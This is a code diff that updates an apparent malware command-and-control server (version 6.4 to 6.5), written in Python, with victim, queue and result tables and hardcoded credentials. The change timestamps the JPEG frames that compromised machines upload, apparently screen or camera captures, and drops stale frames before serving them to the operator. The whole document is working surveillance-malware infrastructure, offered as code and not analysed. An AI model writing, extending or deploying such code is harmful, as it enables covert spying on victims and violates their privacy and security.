@@ -6,7 +6,7 @@ logging.basicConfig(stream=sys.stdout, level=logging.INFO,
                     format="%(asctime)s %(levelname)s %(message)s", force=True)
 LOG = logging.getLogger("drph")
 
-VERSION = "6.4"
+VERSION = "6.5"
 TOKEN = "drph"
 ADMIN = "drph"
 
@@ -14,7 +14,7 @@ VICTIMS = {}
 QUEUES  = {}
 RESULTS = {}
 CONDITIONS = {}
-STREAMS = {}  # vid -> jpeg bytes
+STREAMS = {}  # vid -> (jpeg bytes, timestamp)
 LOCK = threading.Lock()
 
 def _json(h, obj, code=200):
@@ -84,19 +84,25 @@ class H(http.server.BaseHTTPRequestHandler):
         if p == "/stream_pull":
             vid = q.get("vid")
             if not vid: return _json(self, {"err":"vid"}, 400)
+            now = time.time()
             with LOCK:
-                data = STREAMS.get(vid)
-            if data:
-                self.send_response(200)
-                self.send_header("Content-Type", "image/jpeg")
-                self.send_header("Content-Length", str(len(data)))
-                self.send_header("Access-Control-Allow-Origin", "*")
-                self.end_headers()
-                try: self.wfile.write(data)
-                except Exception: pass
-            else:
-                self.send_response(204)
-                self.end_headers()
+                item = STREAMS.get(vid)
+            
+            if item:
+                data, ts = item
+                # If frame is older than 5 seconds, don't serve it (stale)
+                if now - ts <= 5.0:
+                    self.send_response(200)
+                    self.send_header("Content-Type", "image/jpeg")
+                    self.send_header("Content-Length", str(len(data)))
+                    self.send_header("Access-Control-Allow-Origin", "*")
+                    self.end_headers()
+                    try: self.wfile.write(data)
+                    except Exception: pass
+                    return
+            
+            self.send_response(204)
+            self.end_headers()
             return
 
         return _json(self, {"err":"not found"}, 404)
@@ -168,7 +174,8 @@ class H(http.server.BaseHTTPRequestHandler):
             vid = self.headers.get("X-DRPH-Vid", "?")
             n = int(self.headers.get("Content-Length", "0"))
             data = self.rfile.read(n)
-            with LOCK: STREAMS[vid] = data
+            with LOCK: 
+                STREAMS[vid] = (data, time.time())
             return _json(self, {"ok": True})
 
         return _json(self, {"err":"not found"}, 404)
